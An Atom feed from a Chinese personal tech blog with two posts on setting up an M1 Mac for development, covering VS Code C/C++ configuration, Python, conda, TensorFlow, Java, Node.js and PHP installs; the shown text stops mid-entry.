<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M@tr1xの日常</title>
  
  
  <link href="https://www.blog.hackerjerry.top/atom.xml" rel="self"/>
  
  <link href="https://www.blog.hackerjerry.top/"/>
  <updated>2022-02-07T10:05:52.868Z</updated>
  <id>https://www.blog.hackerjerry.top/</id>
  
  <author>
    <name>M@tr1x</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安装vscode并配置环境</title>
    <link href="https://www.blog.hackerjerry.top/2022/%E5%AE%89%E8%A3%85vscode%E5%B9%B6%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/"/>
    <id>https://www.blog.hackerjerry.top/2022/%E5%AE%89%E8%A3%85vscode%E5%B9%B6%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/</id>
    <published>2022-02-05T12:02:48.000Z</published>
    <updated>2022-02-07T10:05:52.868Z</updated>
    
    <content type="html"><![CDATA[<h1 id="c-c"><a href="#c-c" class="headerlink" title="c/c++"></a>c/c++</h1><p>参考：</p><ul><li><a href="https://blog.csdn.net/qq_35926606/article/details/116018953">https://blog.csdn.net/qq_35926606/article/details/116018953</a></li><li><a href="https://blog.csdn.net/qq_45596100/article/details/121114828">https://blog.csdn.net/qq_45596100/article/details/121114828</a></li><li><a href="https://blog.csdn.net/IAMoldpan/article/details/119978907">https://blog.csdn.net/IAMoldpan/article/details/119978907</a></li></ul><p>首先是下载几个插件。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062567837-7eabd8ef-0de2-48a2-bd86-51c453d4ec92.png#crop=0&crop=0&crop=1&crop=1&id=sXGWi&originHeight=732&originWidth=498&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后，codeLLDB 会要求下载一个 package，直接在 vscode 里下载巨慢无比，我就去 github 直接下载了，然后这样子安装：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062567944-adec4fb5-ebcc-4b87-a61d-4fd206b046bc.png#crop=0&crop=0&crop=1&crop=1&id=Tp5Tj&originHeight=564&originWidth=838&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后新建 cpp 文件。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568040-07844546-5aad-4dc8-9e1b-fe5ff042570d.png#crop=0&crop=0&crop=1&crop=1&id=BMoSM&originHeight=666&originWidth=2110&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h2 id="1-配置-tasks-json-文件"><a href="#1-配置-tasks-json-文件" class="headerlink" title="1.配置 tasks.json 文件"></a>1.配置 tasks.json 文件</h2><p>首先，点击顶部菜单栏中的终端—配置默认生成任务—C/C++ clang++，此时会生成一个 tasks.json 文件，这个文件是默认生成的，需要修改其中的 args 选项，添加一个”-std=c++17”,，修改如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JSON">&quot;args&quot;: [<br>  &quot;-fdiagnostics-color=always&quot;,<br>  &quot;-g&quot;,<br>  &quot;$&#123;file&#125;&quot;,<br>  &quot;-std=c++17&quot;,<br>  &quot;-o&quot;,<br>  <span class="hljs-string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;&quot;</span><br>]<br></code></pre></td></tr></table></figure><h2 id="2-配置-c-cpp-properties-json-文件"><a href="#2-配置-c-cpp-properties-json-文件" class="headerlink" title="2.配置 c_cpp_properties.json 文件"></a>2.配置 c_cpp_properties.json 文件</h2><p>使用组合键 shift+command+p 调出 C/C++:编辑配置（json），此时会自动生成一个 c_cpp_properties.json 文件。<br>修改编译器为 clang++：<br>将”compilerPath”: “/usr/bin/clang”,修改为”compilerPath”: “/usr/bin/clang++”,<br>修改 C 标准为 C17：<br>将”cppStandard”: “c98”,修改为”cppStandard”: “c17”,</p><blockquote><p>注意，上面那个组合键和番茄 todo 的专注快捷键冲突了，但是它不会报错。。。我按了好几遍都没出来差点怀疑人生。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568171-ad7d9ec1-3b43-4aaf-8f32-8d81736d8237.png#crop=0&crop=0&crop=1&crop=1&id=Xv4Dp&originHeight=828&originWidth=1648&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后配置完成后，点击顶部菜单栏中的终端—运行生成任务，此时会生成一个二进制文件，右键这个二进制文件，点击在终端中打开，键入./你的二进制文件名，即可看到输出结果。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568265-38fff787-0188-46dc-864e-6090f8f7d417.png#crop=0&crop=0&crop=1&crop=1&id=y5JKm&originHeight=406&originWidth=952&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h2 id="3-Debug-调试"><a href="#3-Debug-调试" class="headerlink" title="3.Debug 调试"></a>3.Debug 调试</h2><p>点击顶部菜单栏中的运行—添加配置—C++(GDB/LLDB)—clang++ 生成活动文件，会生成一个 launch.json 文件。<br>在文件中将”type”: “cppdbg”,修改为”type”: “lldb”,<br>到此，所有配置工作均完成。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568360-b580675d-4637-4d64-ab60-6067751dd9dd.png#crop=0&crop=0&crop=1&crop=1&id=gMnzj&originHeight=596&originWidth=1014&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>大功告成。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062568431-e7291774-4e92-4f01-88a2-ce6d2745cc2e.png#crop=0&crop=0&crop=1&crop=1&id=MR86D&originHeight=1580&originWidth=2184&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后设置了一下，可以让 vscode 调试的时候调用外部的 terminal，试了一下感觉没啥用，就换回去了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;c-c&quot;&gt;&lt;a href=&quot;#c-c&quot; class=&quot;headerlink&quot; title=&quot;c/c++&quot;&gt;&lt;/a&gt;c/c++&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/qq_35926606/ar</summary>
      
    
    
    
    <category term="mac" scheme="https://www.blog.hackerjerry.top/categories/mac/"/>
    
    <category term="m1" scheme="https://www.blog.hackerjerry.top/categories/mac/m1/"/>
    
    
    <category term="踩坑教程" scheme="https://www.blog.hackerjerry.top/tags/%E8%B8%A9%E5%9D%91%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>编程环境搭建</title>
    <link href="https://www.blog.hackerjerry.top/2022/%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://www.blog.hackerjerry.top/2022/%E7%BC%96%E7%A8%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2022-02-05T12:02:22.000Z</published>
    <updated>2022-02-07T10:05:52.960Z</updated>
    
    <content type="html"><![CDATA[<p>写在前面，本文主要基于<a href="https://f5soft.site/zh/notes/2021/0214/">https://f5soft.site/zh/notes/2021/0214/</a> 一文写成，用于记录安装过程中遇到的各种问题，便于日后快速复盘。</p><h1 id="安装-python"><a href="#安装-python" class="headerlink" title="安装 python"></a>安装 python</h1><p>通过 Homebrew 安装 python3.9。<br>系统自带 python2.7 和 python3.8.9,这个作者说安装一下原生支持 arm 的 python,于是我就安装了。<br>通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">brew install python3<br></code></pre></td></tr></table></figure><p>即可安装 arm 版本的 3.9.1，其路径在<code>/opt/homebrew/bin/python3</code>。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541079-c7a63b17-c596-481e-89fc-2e78de862d95.png#crop=0&crop=0&crop=1&crop=1&id=pUMSX&originHeight=674&originWidth=1434&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>安装好之后，需要通过<code>pip3</code>安装一些基本的第三方库。由于这里是 macos-arm64 平台，因此很多库都没有来得及提供该平台的 wheel，导致很多库都需要通过手动编译安装，而且编译过程往往出错。下面是常用库的 arm 版本的安装方法整理：</p><table><thead><tr><th>库名称</th><th>pip3 install 是否需要编译，编译是否成功</th><th>安装方法</th></tr></thead><tbody><tr><td>numpy</td><td>需要编译，安装成功</td><td></td></tr><tr><td>scipy</td><td>不知道是不是高铁上网不好，pip 失败</td><td>brew install scipy</td></tr><tr><td>matplotlib</td><td>需要编译，安装成功</td><td></td></tr><tr><td>pandas</td><td>成功</td><td></td></tr><tr><td>sympy</td><td>成功</td><td></td></tr><tr><td>cv2</td><td>无相应轮子</td><td>brew install opencv (花了巨长时间下载）python 里面 import cv2 即可验证</td></tr><tr><td>pycrypto</td><td>编译成功</td><td></td></tr><tr><td>requests</td><td>编译成功</td><td></td></tr><tr><td>jupyter</td><td>编译成功</td><td></td></tr><tr><td>scapy</td><td>编译成功</td><td></td></tr><tr><td>regex</td><td>直接安装</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>首先是 numpy，我一开始使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">matr1x@matr1xdeMacBook-Air ~ % pip3 install numpy<br></code></pre></td></tr></table></figure><p>调用的是系统自带的 python3.8 的 pip3，然后它被安装在了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541291-32f78767-b268-40cb-a8a3-7ee831486c64.png#crop=0&crop=0&crop=1&crop=1&id=MRnLV&originHeight=852&originWidth=1698&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>然后，我发现其实 brew 下也是有 pip3 和 pip3.9 的，应该是 pip3 的顺序系统的比较靠前，然后我使用了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">matr1x@matr1xdeMacBook-Air ~ % <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;&#x27;</span> &gt;&gt; ~/.zprofile<br>matr1x@matr1xdeMacBook-Air ~ % <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(/opt/homebrew/bin/brew shellenv)</span>&quot;</span><br></code></pre></td></tr></table></figure><p>此时发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">matr1x@matr1xdeMacBook-Air ~ % <span class="hljs-built_in">which</span> pip3<br>/opt/homebrew/bin/pip3<br></code></pre></td></tr></table></figure><p>再次运行<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541453-80d31bf3-847b-4ebb-ad3e-5e2ae156ff6d.png#crop=0&crop=0&crop=1&crop=1&id=Lp3x7&originHeight=424&originWidth=1708&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>此时查看路径<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541562-605a738a-5482-4757-8967-9478682d10c7.png#crop=0&crop=0&crop=1&crop=1&id=G6Syu&originHeight=322&originWidth=1302&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="></p><h1 id="安装-conda"><a href="#安装-conda" class="headerlink" title="安装 conda"></a>安装 conda</h1><p>由于 Anaconda 没有支持 arm，但是 miniforge 已经支持。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">brew install --cask miniforge<br></code></pre></td></tr></table></figure><p>自动链接，查看结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs Bash">matr1x@matr1xdeMacBook-Air ~ % conda list<br><span class="hljs-comment"># packages in environment at /opt/homebrew/Caskroom/miniforge/base:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Name                    Version                   Build  Channel</span><br>brotlipy                  0.7.0           py39h5161555_1003    conda-forge<br>ca-certificates           2021.10.8            h4653dfc_0    conda-forge<br>certifi                   2021.10.8        py39h2804cbe_1    conda-forge<br>cffi                      1.15.0           py39h52b1de0_0    conda-forge<br>charset-normalizer        2.0.9              pyhd8ed1ab_0    conda-forge<br>colorama                  0.4.4              pyh9f0ad1d_0    conda-forge<br>conda                     4.11.0           py39h2804cbe_0    conda-forge<br>conda-package-handling    1.7.3            py39h5161555_1    conda-forge<br>cryptography              36.0.0           py39hfb8cd70_0    conda-forge<br>idna                      3.1                pyhd3deb0d_0    conda-forge<br>libffi                    3.4.2                h3422bc3_5    conda-forge<br>libzlib                   1.2.11            hee7b306_1013    conda-forge<br>ncurses                   6.2                  h9aa5885_4    conda-forge<br>openssl                   1.1.1l               h3422bc3_0    conda-forge<br>pip                       21.3.1             pyhd8ed1ab_0    conda-forge<br>pycosat                   0.6.3           py39h5161555_1009    conda-forge<br>pycparser                 2.21               pyhd8ed1ab_0    conda-forge<br>pyopenssl                 21.0.0             pyhd8ed1ab_0    conda-forge<br>pysocks                   1.7.1            py39h2804cbe_4    conda-forge<br>python                    3.9.7           h54d631c_3_cpython    conda-forge<br>python_abi                3.9                      2_cp39    conda-forge<br>readline                  8.1                  hedafd6a_0    conda-forge<br>requests                  2.26.0             pyhd8ed1ab_1    conda-forge<br>ruamel_yaml               0.15.80         py39h5161555_1006    conda-forge<br>setuptools                59.4.0           py39h2804cbe_0    conda-forge<br>six                       1.16.0             pyh6c4a22f_0    conda-forge<br>sqlite                    3.37.0               h72a2b83_0    conda-forge<br>tk                        8.6.11               he1e0b03_1    conda-forge<br>tqdm                      4.62.3             pyhd8ed1ab_0    conda-forge<br>tzdata                    2021e                he74cb21_0    conda-forge<br>urllib3                   1.26.7             pyhd8ed1ab_0    conda-forge<br>wheel                     0.37.0             pyhd8ed1ab_1    conda-forge<br>xz                        5.2.5                h642e427_1    conda-forge<br>yaml                      0.2.5                h642e427_0    conda-forge<br>zlib                      1.2.11            hee7b306_1013    conda-forge<br></code></pre></td></tr></table></figure><p>可以看到和 pip3 的相比少了很多库。暂时没找到相应的简单方法，只能创建虚拟环境的时候再下一遍了。</p><h1 id="安装-tensorflow2-4"><a href="#安装-tensorflow2-4" class="headerlink" title="安装 tensorflow2.4"></a>安装 tensorflow2.4</h1><p>亲测有效，但无法调用 GPU。<br><a href="https://_www.cnblogs.com_practitioners_p_15514567/">https://www.cnblogs.com/practitioners/p/15514567.html</a><br>先创建 yml，注意，用 vscode 创建。（系统自带的文本编辑器只能导出 trf 格式的文件，很离谱）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs Bash">name: apple_tensorflow<br>  channels:<br>    - conda-forge<br>    - nodefaults<br>  dependencies:<br>    - grpcio<br>    - h5py<br>    - ipython<br>    - numpy<br>    - pip=20.2.4<br>    - python=3.8<br>    - scipy<br>    - termcolor<br>    - typeguard<br>    - wheel<br>    - absl-py<br>    - astunparse<br>    - python-flatbuffers<br>    - gast<br>    - google-pasta<br>    - keras-preprocessing<br>    - opt_einsum<br>    - protobuf<br>    - tensorboard<br>    - tensorflow-estimator<br>    - termcolor<br>    - typing_extensions<br>    - wrapt<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">conda env create --file=/Users/matr1x/Documents/env.yml  --name=tensorflow<br></code></pre></td></tr></table></figure><p>之后激活并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">(base) matr1x@matr1xdeMacBook-Air ~ % conda activate tensorflow<br>(tensorflow) matr1x@matr1xdeMacBook-Air ~ % pip install --upgrade --force --no-dependencies https://github.com/apple/tensorflow_macos/releases/download/v0.1alpha3/tensorflow_macos-0.1a3-cp38-cp38-macosx_11_0_arm64.whl https://github.com/apple/tensorflow_macos/releases/download/v0.1alpha3/tensorflow_addons_macos-0.1a3-cp38-cp38-macosx_11_0_arm64.whl<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs Python">(tensorflow) matr1x@matr1xdeMacBook-Air ~ % python<br>Python <span class="hljs-number">3.8</span><span class="hljs-number">.12</span> | packaged by conda-forge | (default, Oct <span class="hljs-number">12</span> <span class="hljs-number">2021</span>, <span class="hljs-number">21</span>:<span class="hljs-number">21</span>:<span class="hljs-number">17</span>)<br>[Clang <span class="hljs-number">11.1</span><span class="hljs-number">.0</span> ] on darwin<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><span class="hljs-meta">&gt;&gt;&gt; </span>print(tf.__version__)<br><span class="hljs-number">2.4</span><span class="hljs-number">.0</span>-rc0<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tensorflow.keras <span class="hljs-keyword">import</span> layers<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tensorflow.keras <span class="hljs-keyword">import</span> models<br><span class="hljs-meta">&gt;&gt;&gt; </span>model = models.Sequential()<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Conv2D(<span class="hljs-number">32</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">&#x27;relu&#x27;</span>, input_shape=(<span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>)))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.MaxPooling2D((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Conv2D(<span class="hljs-number">64</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">&#x27;relu&#x27;</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.MaxPooling2D((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Conv2D(<span class="hljs-number">64</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">&#x27;relu&#x27;</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Flatten())<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Dense(<span class="hljs-number">64</span>, activation=<span class="hljs-string">&#x27;relu&#x27;</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.add(layers.Dense(<span class="hljs-number">10</span>, activation=<span class="hljs-string">&#x27;softmax&#x27;</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.summary()<br>Model: <span class="hljs-string">&quot;sequential&quot;</span><br>_________________________________________________________________<br>Layer (type)                 Output Shape              Param <span class="hljs-comment">#</span><br>=================================================================<br>conv2d (Conv2D)              (<span class="hljs-literal">None</span>, <span class="hljs-number">26</span>, <span class="hljs-number">26</span>, <span class="hljs-number">32</span>)        <span class="hljs-number">320</span><br>_________________________________________________________________<br>max_pooling2d (MaxPooling2D) (<span class="hljs-literal">None</span>, <span class="hljs-number">13</span>, <span class="hljs-number">13</span>, <span class="hljs-number">32</span>)        <span class="hljs-number">0</span><br>_________________________________________________________________<br>conv2d_1 (Conv2D)            (<span class="hljs-literal">None</span>, <span class="hljs-number">11</span>, <span class="hljs-number">11</span>, <span class="hljs-number">64</span>)        <span class="hljs-number">18496</span><br>_________________________________________________________________<br>max_pooling2d_1 (MaxPooling2 (<span class="hljs-literal">None</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">64</span>)          <span class="hljs-number">0</span><br>_________________________________________________________________<br>conv2d_2 (Conv2D)            (<span class="hljs-literal">None</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">64</span>)          <span class="hljs-number">36928</span><br>_________________________________________________________________<br>flatten (Flatten)            (<span class="hljs-literal">None</span>, <span class="hljs-number">576</span>)               <span class="hljs-number">0</span><br>_________________________________________________________________<br>dense (Dense)                (<span class="hljs-literal">None</span>, <span class="hljs-number">64</span>)                <span class="hljs-number">36928</span><br>_________________________________________________________________<br>dense_1 (Dense)              (<span class="hljs-literal">None</span>, <span class="hljs-number">10</span>)                <span class="hljs-number">650</span><br>=================================================================<br>Total params: <span class="hljs-number">93</span>,<span class="hljs-number">322</span><br>Trainable params: <span class="hljs-number">93</span>,<span class="hljs-number">322</span><br>Non-trainable params: <span class="hljs-number">0</span><br>_________________________________________________________________<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tensorflow.keras.datasets <span class="hljs-keyword">import</span> mnist<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tensorflow.keras.utils <span class="hljs-keyword">import</span> to_categorical<br><span class="hljs-meta">&gt;&gt;&gt; </span>(train_images, train_labels), (test_images, test_labels) = mnist.load_data()<br><span class="hljs-meta">&gt;&gt;&gt; </span>train_images = train_images.reshape((<span class="hljs-number">60000</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>train_images = train_images.astype(<span class="hljs-string">&#x27;float32&#x27;</span>) / <span class="hljs-number">255</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>test_images = test_images.reshape((<span class="hljs-number">10000</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>))<br><span class="hljs-meta">&gt;&gt;&gt; </span>test_images = test_images.astype(<span class="hljs-string">&#x27;float32&#x27;</span>) / <span class="hljs-number">255</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>train_labels = to_categorical(train_labels)<br><span class="hljs-meta">&gt;&gt;&gt; </span>test_labels = to_categorical(test_labels)<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.compile(optimizer=<span class="hljs-string">&#x27;rmsprop&#x27;</span>,<br><span class="hljs-meta">... </span>              loss=<span class="hljs-string">&#x27;categorical_crossentropy&#x27;</span>,<br><span class="hljs-meta">... </span>              metrics=[<span class="hljs-string">&#x27;accuracy&#x27;</span>])<br><span class="hljs-meta">&gt;&gt;&gt; </span>model.fit(train_images, train_labels, epochs=<span class="hljs-number">5</span>, batch_size=<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1629942/1644062541663-f6cc2982-a295-408a-88f3-6136dc8faa70.png#crop=0&crop=0&crop=1&crop=1&id=cFViy&originHeight=1436&originWidth=2198&originalType=binary%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&title="><br>模型是训练出来了，但是不能调用 gpu。<br><a href="https://www.jianshu.com/p/0b5342f4af95">https://www.jianshu.com/p/0b5342f4af95</a> 这篇文章也提到了，不过说 tf2.5 可以调用 gpu，我先不管了，这个能用就行。<br>而关于 2.5 的 tf，可以查看<a href="https://makeoptim.com/deep-learning/tensorflow-metal">https://makeoptim.com/deep-learning/tensorflow-metal</a><br>and <a href="https://_www.icode9.com_content-4-1210377/">https://www.icode9.com/content-4-1210377.html</a><br>不过得升级到 mac os 12+</p><h1 id="安装-java"><a href="#安装-java" class="headerlink" title="安装 java"></a>安装 java</h1><p>首先退出 conda 环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">conda deactivate<br></code></pre></td></tr></table></figure><p>可在官网下载全部的 JDK8 ～ JDK16 的 macos-arm64 版本的 JDK。<br><a href="https://www.azul.com/downloads/zulu-community/?package=jdk">https://www.azul.com/downloads/zulu-community/?package=jdk</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Bash">(base) matr1x@matr1xdeMacBook-Air ~ % <span class="hljs-built_in">which</span> java<br>/usr/bin/java<br>(base) matr1x@matr1xdeMacBook-Air ~ % file /usr/bin/java<br>/usr/bin/java: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64e:Mach-O 64-bit executable arm64e]<br>/usr/bin/java (<span class="hljs-keyword">for</span> architecture x86_64):  Mach-O 64-bit executable x86_64<br>/usr/bin/java (<span class="hljs-keyword">for</span> architecture arm64e):  Mach-O 64-bit executable arm64e<br>(base) matr1x@matr1xdeMacBook-Air ~ % file /usr/bin/javac<br>/usr/bin/javac: Mach-O universal binary with 2 architectures: [x86_64:Mach-O 64-bit executable x86_64] [arm64e:Mach-O 64-bit executable arm64e]<br>/usr/bin/javac (<span class="hljs-keyword">for</span> architecture x86_64):  Mach-O 64-bit executable x86_64<br>/usr/bin/javac (<span class="hljs-keyword">for</span> architecture arm64e):  Mach-O 64-bit executable arm64e<br></code></pre></td></tr></table></figure><p>下载后安装即可。</p><h1 id="安装-nodejs"><a href="#安装-nodejs" class="headerlink" title="安装 nodejs"></a>安装 nodejs</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Bash">brew install node<br>(base) matr1x@matr1xdeMacBook-Air ~ % node -v<br>v17.4.0<br></code></pre></td></tr></table></figure><h1 id="安装-PHP"><a href="#安装-PHP" class="headerlink" title="安装 PHP"></a>安装 PHP</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">brew install php<br></code></pre></td></tr></table></figure><h1 id="Terminal-美化"><a href="#Terminal-美化" class="headerlink" title="Terminal 美化"></a>Terminal 美化</h1><p>非常简单。 1.下载字体，安装，并将终端字体改为它。</p><ul><li><a href="%5Bhttps://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS%5D(https://github.com/romkatv/powerlevel10k-media/raw/master/MesloLGS">MesloLGS NF Regular.ttf</a> NF Regular.ttf)</li><li><a 